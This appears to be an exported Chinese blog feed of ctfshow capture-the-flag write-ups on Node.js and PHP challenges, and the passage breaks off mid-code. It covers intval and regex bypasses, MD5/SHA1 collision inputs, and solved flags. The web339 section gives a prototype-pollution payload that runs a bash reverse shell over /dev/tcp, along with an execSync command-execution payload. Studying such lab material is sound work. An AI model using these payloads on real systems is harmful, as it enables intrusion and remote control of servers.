class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure>
<p>要求a和b不能为空，a的长度等于b的长度，a不能等于b,且a+flag的md5值要等于b+flag的md5值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a &amp;&amp; b &amp;&amp; a.length===b.length &amp;&amp; a!==b &amp;&amp; md5(a+flag)===md5(b+flag</span><br></pre></td></tr></table></figure>
<p>?a[]=1&amp;b[]=2</p>
<h1>web338</h1>
<p><img src="/2025/03/16/nodejs/D:%5CBlog%5Csource_posts%5Cnodejs%5Cimage-20250409122148200.png" alt="image-20250409122148200"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;ctfshow&quot;: &quot;36dboy&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
<h1>web339</h1>
<p>这里与338的题不一样在ctfshow要为flag，但是我们并不知道flag是啥</p>
<p><img src="/2025/03/16/nodejs/D:%5CBlog%5Csource_posts%5Cnodejs%5Cimage-20250409121637671.png" alt="image-20250409121637671"></p>
<p>其实这里还多了一个文件app.js，我们的入手点就在其中</p>
<p><img src="/2025/03/16/nodejs/D:%5CBlog%5Csource_posts%5Cnodejs%5Cimage-20250409123736951.png" alt="image-20250409123736951"></p>
<p>其中有</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Function(query)(query)</span><br></pre></td></tr></table></figure>
<p><code>Function(query)</code> 动态创建了一个新的函数，相当于 <code>new Function('query')</code>。</p>
<ul>
<li>也就是说，把**<code>query</code>字符串内容**当作 JavaScript 代码执行了！</li>
</ul>
<p>然后紧接着 <code>(query)</code>，又<strong>执行</strong>了这个新建的函数。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;query&quot;: &quot;return process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;id&#x27;).toString()&quot;</span><br><span class="line">&#125;</span><br><span class="line">就相当于</span><br><span class="line">Function(&quot;return process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;id&#x27;).toString()&quot;)()</span><br></pre></td></tr></table></figure>
<p>我们这里结合反弹shll的知识</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1\&quot;&#x27;);var __tmp2&quot;&#125;&#125;</span><br><span class="line">//nc -lvnp port接着post访问api.js就可以反弹shell了</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title>php特性</title>
    <url>/2025/02/05/php%E7%89%B9%E6%80%A7/</url>
    <content><![CDATA[<h1>intval函数，虽然这里是这一个函数，但这里的绕过知识可以类比其他函数</h1>
<p>intval() 函数可以获取变量的「整数值」，常用于<a href="https://so.csdn.net/so/search?q=%E5%BC%BA%E5%88%B6%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2&amp;spm=1001.2101.3001.7020">强制类型转换</a>。</p>
<p><strong>语法</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> <span class="title function_ invoke__">intval</span>( <span class="variable">$var</span>, <span class="variable">$base</span> )</span><br></pre></td></tr></table></figure>
<p><strong>参数</strong></p>
<ul>
<li>$var：需要转换成 integer 的「变量」</li>
<li>$base：转换所使用的「进制」</li>
</ul>
<p><strong>返回值</strong></p>
<p>返回值为 integer 类型，可能是 0 或 1 或 其他integer 值。</p>
<ul>
<li>0：失败 或 空array 返回 0</li>
<li>1：非空array 返回 1</li>
<li>其他integer值：成功时 返回 $var 的 integer 值。</li>
</ul>
<p>返回值的「最大值」取决于系统</p>
<ul>
<li>32 位系统（-2147483648 到 2147483647）</li>
<li>64 位系统（-9223372036854775808到9223372036854775807）</li>
</ul>
<h2 id="一、进制自动转换">一、进制自动转换</h2>
<p>第二个参数 $base 允许为空。</p>
<p>当 base 为空时，默认值是 0，会根据 $var 的格式来调整转换的进制。</p>
<ul>
<li>如果 $var 以 0 开头，就使用 8进制</li>
<li>如果 $var 以0x开头，就使用 16进制</li>
<li>否则，就使用 10进制</li>
</ul>
<p><strong>实例：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 10的 8进制是12</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">intval</span>(<span class="number">012</span>));</span><br><span class="line"><span class="comment"># 10的 16进制是A</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">intval</span>(<span class="number">0xA</span>));</span><br><span class="line"><span class="comment"># 10的 10进制是10</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">intval</span>(<span class="number">10</span>));</span><br></pre></td></tr></table></figure>
<p>输出：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">int(10)</span><br><span class="line">int(10)</span><br><span class="line">int(10)</span><br></pre></td></tr></table></figure>
<p>绕过思路：当某个数字被过滤时，可以使用它的 8进制/16进制来绕过，但通常过滤数字的话全部会过滤，接下来的方法可以尝试</p>
<h2 id="二、转换数组">二、转换数组</h2>
<p>intval() 转换数组类型时，不关心数组中的内容，只判断数组中有没有元素。</p>
<ul>
<li>「空数组」返回 0</li>
<li>「非空数组」返回 1</li>
</ul>
<p><strong>实例：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">intval</span>(<span class="keyword">array</span>()));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">intval</span>(<span class="keyword">array</span>(<span class="number">3</span>,<span class="number">2</span>)));</span><br><span class="line"><span class="number">12</span></span><br></pre></td></tr></table></figure>
<p><strong>输出</strong>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">int(0)</span><br><span class="line">int(1)</span><br><span class="line">12</span><br></pre></td></tr></table></figure>
<p>如果传入的 $var是数组中的某个值时，则当做变量来转换，而不是当做数组类型。</p>
<p><strong>实例：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$arr1</span> = <span class="keyword">array</span>(<span class="number">8</span>,<span class="number">6</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$arr1</span>[<span class="number">0</span>]));</span><br><span class="line"><span class="number">123</span></span><br></pre></td></tr></table></figure>
<p>输出：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">int(8)</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
<p>绕过思路：对于弱比较（a==b），可以给a、b两个参数传入空数组，使弱比较为true。</p>
<h2 id="三、转换小数">三、转换小数</h2>
<p>intval() 转换小数类型时，只返回个位数，不遵循四舍五入的原则。</p>
<p><strong>实例：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">intval</span>(<span class="number">12</span>));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">intval</span>(<span class="number">1.2</span>));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">intval</span>(<span class="number">1.9</span>));</span><br></pre></td></tr></table></figure>
<p><strong>输出</strong>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">int(12)</span><br><span class="line">int(1)</span><br><span class="line">int(1)</span><br><span class="line">123</span><br></pre></td></tr></table></figure>
<p>绕过思路：当某个数字被过滤时，可以给它增加小数位来绕过。</p>
<h2 id="四、转换字符串">*四、转换字符串</h2>
<p>intval() 转换字符串类型时，会判断字符串是否以数字开头</p>
<ul>
<li>如果以数字开头，就返回1个或多个连续的数字</li>
<li>如果以字母开头，就返回0</li>
</ul>
<p>单双引号对转换结果没有影响，并且 0 或 0x 开头也只会当做普通字符串处理。</p>
<p><strong>实例</strong>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">var_dump(intval(<span class="string">&#x27;12abc&#x27;</span>));</span><br><span class="line">var_dump(intval(<span class="string">&quot;12abc&quot;</span>));</span><br><span class="line">var_dump(intval(<span class="string">&#x27;abc123&#x27;</span>));</span><br><span class="line">var_dump(intval(<span class="string">&#x27;1a2b3c&#x27;</span>));</span><br><span class="line">var_dump(intval(<span class="string">&#x27;0101&#x27;</span>));</span><br><span class="line">var_dump(intval(<span class="string">&quot;0x2b&quot;</span>));</span><br></pre></td></tr></table></figure>
<p><strong>输出</strong>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">int(12)</span><br><span class="line">int(12)</span><br><span class="line">int(0)</span><br><span class="line">int(1)</span><br><span class="line">int(101)</span><br><span class="line">int(0)</span><br></pre></td></tr></table></figure>
<h2 id="五、取反">五、取反~</h2>
<p>intval() 函数支持一些特殊符号的，比如<code>~</code>取反。</p>
<p><strong>实例：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">intval</span>(~<span class="number">10</span>));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">intval</span>(~~<span class="number">10</span>));</span><br></pre></td></tr></table></figure>
<p><strong>输出</strong>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">int(-11)</span><br><span class="line">int(10)</span><br></pre></td></tr></table></figure>
<p>绕过思路：当某个数字被过滤时，可以两次取反来绕过。</p>
<h2 id="六、算数运算符">六、算数运算符</h2>
<p>intval() 函数支持算数运算符，如果传入的 $var参数包含算数运算符，会先运算，再对运算结果进行转换。</p>
<p><strong>实例：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">intval</span>(<span class="number">5</span>*<span class="number">5</span>));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">intval</span>(<span class="number">5</span>+<span class="number">5</span>));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">intval</span>(<span class="number">05</span>+<span class="number">5</span>));</span><br></pre></td></tr></table></figure>
<p><strong>输出</strong>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">int(25)</span><br><span class="line">int(10)</span><br><span class="line">int(10)</span><br><span class="line">123</span><br></pre></td></tr></table></figure>
<p>绕过思路：当某个数字被过滤时，可以使用算数运算符绕过。</p>
<h2 id="七、浮点数精度缺失问题">七、浮点数精度缺失问题</h2>
<p>由于PHP中的浮点数是「弱类型」，存在「精度丢失」的问题，在转换时可能会出现意料之外的情况。</p>
<p>比如下面这个案例，第一个输出34正常，第二个以为会输出58，结果输出了57。</p>
<p><strong>实例：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">intval</span>(<span class="number">0.34</span>*<span class="number">100.0</span>));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">intval</span>(<span class="number">0.58</span>*<span class="number">100.0</span>));</span><br></pre></td></tr></table></figure>
<p><strong>输出</strong>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">int(34)</span><br><span class="line">int(57)</span><br></pre></td></tr></table></figure>
<h2 id="intval-绕过思路">intval()绕过思路</h2>
<p>最后汇总一下intval()函数漏洞的绕过思路：</p>
<p>1）当某个数字被过滤时，可以使用它的 8进制/16进制来绕过；比如过滤10，就用012（八进制）或0xA（十六进制）。<br>
2）对于弱比较（a==b），可以给a、b两个参数传入空数组，使弱比较为true。<br>
3）当某个数字被过滤时，可以给它增加小数位来绕过；比如过滤3，就用3.1。<br>
4）当某个数字被过滤时，可以给它拼接字符串来绕过；比如过滤3，就用3ab。（GET请求的参数会自动拼接单引号）<br>
5）当某个数字被过滤时，可以两次取反来绕过；比如过滤10，就用~~10。<br>
6）当某个数字被过滤时，可以使用算数运算符绕过；比如过滤10，就用 5+5 或 2*5。<br>
原文链接：<a href="https://blog.csdn.net/wangyuxiang946/article/details/131156104">https://blog.csdn.net/wangyuxiang946/article/details/131156104</a></p>
<h2 id="MD5碰撞">MD5碰撞</h2>
<p>md5加密后为万能密码的:</p>
<p>ffifdyop	<a href="https://www.jianshu.com/p/e37e26d2ba7f">https://www.jianshu.com/p/e37e26d2ba7f</a></p>
<p>本来就是0e开头的<strong>0e215962017</strong>经过md5后还是0e开头</p>
<p>QNKCDZO</p>
<p>240610708</p>
<p>s1502113478a</p>
<p>s1885207154a</p>
<p>s1836677006a</p>
<p>s155964671a</p>
<p>s1184209335a</p>
<p><a href="https://blog.csdn.net/m0_73818134/article/details/131793815">md5</a></p>
<p>MD5强碰撞<strong>在burp抓包了才成功</strong></p>
<p>强碰撞 就是加了一个string转换，导致==绕不过去</p>
<p>md5强碰撞例子</p>
<p>psycho%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00W%ADZ%AF%3C%8A%13V%B5%96%18m%A5%EA2%81_%FB%D9%24%22%2F%8F%D4D%A27vX%B8%08%D7m%2C%E0%D4LR%D7%FBo%10t%19%02%82%7D%7B%2B%9Bt%05%FFl%AE%8DE%F4%1F%84%3C%AE%01%0F%9B%12%D4%81%A5J%F9H%0FyE%2A%DC%2B%B1%B4%0F%DEcC%40%DA29%8B%C3%00%7F%8B_h%C6%D3%8Bd8%AF%85%7C%14w%06%C2%3AC%BC%0C%1B%FD%BB%98%CE%16%CE%B7%B6%3A%F3%99%B59%F9%FF%C2</p>
<p>与</p>
<p>psycho%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00W%ADZ%AF%3C%8A%13V%B5%96%18m%A5%EA2%81_%FB%D9%A4%22%2F%8F%D4D%A27vX%B8%08%D7m%2C%E0%D4LR%D7%FBo%10t%19%02%02%7E%7B%2B%9Bt%05%FFl%AE%8DE%F4%1F%04%3C%AE%01%0F%9B%12%D4%81%A5J%F9H%0FyE%2A%DC%2B%B1%B4%0F%DEc%C3%40%DA29%8B%C3%00%7F%8B_h%C6%D3%8Bd8%AF%85%7C%14w%06%C2%3AC%3C%0C%1B%FD%BB%98%CE%16%CE%B7%B6%3A%F3%9959%F9%FF%C2</p>
<p>还有</p>
<p>M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2</p>
<p>与</p>
<p>M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</p>
<p>shal加密的与md5的一样</p>
<p>如果是强比较，没有转为string，可以用数组 例如 a[]=1&amp;b[]=2来绕过，也可以用强碰撞</p>
<p>如果是强比较，转为string，只能用强碰撞</p>
<p>shal强碰撞例子</p>
<p>%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1</p>
<p>与</p>
<p>%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1</p>
<h1>web89</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]/&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>1代表true；0代表false</p>
<p>intval();</p>
<p>preg_match()只能处理字符串，如果处理数组会返回false。…看来得补一下各种绕过知识了</p>
<p>intval如果传入数组，会返回1</p>
<p>?num[]=2，后面的数字2可以随便换</p>
<p>ctfshow{a5e284d7-40c2-4e98-8c82-27f479ad717e}</p>
<h1>web90</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>intval处理开头是数字的字符串时，返回值为开头的数</p>
<p>?num=4476a</p>
<p>ctfshow{6a8b00b5-3ae2-4d7f-a9c8-47a502188bee}</p>
<h1>web91</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/im&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/i&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;hacker&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;nonononono&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong><code>/^</code></strong></p>
<ul>
<li>表示匹配字符串的开头。</li>
</ul>
<p><strong><code>php</code></strong></p>
<ul>
<li>表示匹配 “php” 这个具体的字符串。</li>
</ul>
<p><strong><code>$/</code></strong></p>
<ul>
<li>表示匹配字符串的结尾。</li>
</ul>
<p><strong><code>i</code>（修饰符）</strong></p>
<ul>
<li>表示不区分大小写匹配。例如，“PHP”、“Php” 都可以匹配。</li>
</ul>
<p><strong><code>m</code>（修饰符）</strong></p>
<ul>
<li>表示多行匹配模式。也就是说，如果 <code>$a</code> 是多行字符串，每行的开头和结尾都会被匹配，而不仅仅是整个字符串的开头和结尾。</li>
</ul>
<p>?cmd=%0aphp或者?cmd=php%0aphp</p>
<p>ctfshow{b3c727a8-48eb-4f8e-a740-dce79e3b6058}</p>
<h1>web92</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>第一个if好绕过，只要不是4476就可以；第二个if，有一个intval()函数，而且任何类型的都可以，那我们，八进制，十六进制都可以</p>
<p>?num=010574</p>
<p>?num=0x117c</p>
<h1>web93</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里又过滤了字母，那我们的十六进制就不可以了，可以试试八进制</p>
<p>?num=010574</p>
<p>ctfshow{ad65cdd0-636d-4c10-9561-adac08ad24db}</p>
<h1>web94</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strpos</span>(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>对于strpos()函数，可以用%0a、小数点、还可以用八进制绕过日(前面加一个%20，达成拼接)</p>
<p>strpos()函数，它要求num中必须有0，但还不能在开头</p>
<p>?num=%0a4476</p>
<p>?num=4476.0</p>
<p>由于第三个if必须要我们在num里面插进去一个0才可以，我们可以把4476换成八进制010574，或者把4476变成小数类型的，</p>
<p>?num=%0a010574</p>
<p>?num=%0a4476.0</p>
<p>?num=%0a010574+01</p>
<p>ctfshow{ac84a184-911a-497e-987e-9ac8af505bd2}</p>
<h1>web95</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]|\./i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strpos</span>(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span 